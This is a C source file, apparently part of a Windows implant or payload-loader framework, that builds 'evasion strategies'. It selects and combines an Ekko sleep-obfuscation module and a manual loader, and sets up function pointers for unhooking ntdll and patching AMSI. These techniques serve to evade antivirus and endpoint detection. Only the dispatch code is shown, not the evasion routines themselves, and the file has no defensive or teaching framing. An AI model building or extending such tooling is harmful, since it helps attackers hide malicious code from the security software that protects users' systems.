#include "../include/common_defines.h"
#include "../include/strategy.h"
#include "../include/rtldr_ctx.h"

// Forward declarations of strategy implementations
BOOL Strategy_LoadEkko(PEVASION_STRATEGY pStrategy);
BOOL Strategy_LoadManualLoader(PEVASION_STRATEGY pStrategy);

// Enhanced strategy factory - initializes the modular evasion framework
BOOL Strategy_Initialize(PRTLDR_CTX ctx, PEVASION_STRATEGY pStrategy) {
    if (!ctx || !pStrategy) {
        return FALSE;
    }
    
    // Zero out strategy structure
    for (SIZE_T i = 0; i < sizeof(EVASION_STRATEGY); i++) {
        ((BYTE*)pStrategy)[i] = 0;
    }
    
    // Load default strategy (Ekko) for backward compatibility
    if (!Strategy_LoadEkko(pStrategy)) {
        return FALSE;
    }
    
    // Initialize the loaded strategy
    if (pStrategy->pfnInitialize) {
        return pStrategy->pfnInitialize(ctx);
    }
    
    return TRUE;
}

// Load specific strategy by type
BOOL Strategy_LoadByType(PRTLDR_CTX ctx, PEVASION_STRATEGY pStrategy, STRATEGY_TYPE type) {
    if (!ctx || !pStrategy) {
        return FALSE;
    }
    
    // Zero out strategy structure
    for (SIZE_T i = 0; i < sizeof(EVASION_STRATEGY); i++) {
        ((BYTE*)pStrategy)[i] = 0;
    }
    
    switch (type) {
        case STRATEGY_EKKO:
            if (!Strategy_LoadEkko(pStrategy)) {
                return FALSE;
            }
            break;
            
        case STRATEGY_MANUAL_LOAD:
            if (!Strategy_LoadManualLoader(pStrategy)) {
                return FALSE;
            }
            break;
            
        case STRATEGY_COMBINED:
            // Load combined strategy (Ekko + Manual Load)
            if (!Strategy_LoadCombined(pStrategy, STRATEGY_EKKO, STRATEGY_MANUAL_LOAD)) {
                return FALSE;
            }
            break;
            
        default:
            return FALSE;
    }
    
    // Set strategy type
    pStrategy->type = type;
    
    // Initialize the loaded strategy
    if (pStrategy->pfnInitialize) {
        return pStrategy->pfnInitialize(ctx);
    }
    
    return TRUE;
}

// Combined strategy implementation
BOOL Strategy_LoadCombined(PEVASION_STRATEGY pStrategy, STRATEGY_TYPE primary, STRATEGY_TYPE secondary) {
    EVASION_STRATEGY primary_strategy = {0};
    EVASION_STRATEGY secondary_strategy = {0};
    
    if (!pStrategy) {
        return FALSE;
    }
    
    // Load primary strategy
    switch (primary) {
        case STRATEGY_EKKO:
            if (!Strategy_LoadEkko(&primary_strategy)) {
                return FALSE;
            }
            break;
        case STRATEGY_MANUAL_LOAD:
            if (!Strategy_LoadManualLoader(&primary_strategy)) {
                return FALSE;
            }
            break;
        default:
            return FALSE;
    }
    
    // Load secondary strategy
    switch (secondary) {
        case STRATEGY_EKKO:
            if (!Strategy_LoadEkko(&secondary_strategy)) {
                return FALSE;
            }
            break;
        case STRATEGY_MANUAL_LOAD:
            if (!Strategy_LoadManualLoader(&secondary_strategy)) {
                return FALSE;
            }
            break;
        default:
            return FALSE;
    }
    
    // Combine strategies (primary takes precedence)
    pStrategy->szStrategyName = "Combined";
    pStrategy->dwVersion = 1;
    pStrategy->type = STRATEGY_COMBINED;
    
    // Take functions from primary, fallback to secondary
    pStrategy->pfnInitialize = primary_strategy.pfnInitialize ? primary_strategy.pfnInitialize : secondary_strategy.pfnInitialize;
    pStrategy->pfnObfuscateSleep = primary_strategy.pfnObfuscateSleep ? primary_strategy.pfnObfuscateSleep : secondary_strategy.pfnObfuscateSleep;
    pStrategy->pfnUnhookNtdll = primary_strategy.pfnUnhookNtdll ? primary_strategy.pfnUnhookNtdll : secondary_strategy.pfnUnhookNtdll;
    pStrategy->pfnPatchAMSI = primary_strategy.pfnPatchAMSI ? primary_strategy.pfnPatchAMSI : secondary_strategy.pfnPatchAMSI;
    pStrategy->pfnCleanup = primary_strategy.pfnCleanup ? primary_strategy.pfnCleanup : secondary_strategy.pfnCleanup;
    
    return TRUE;
} 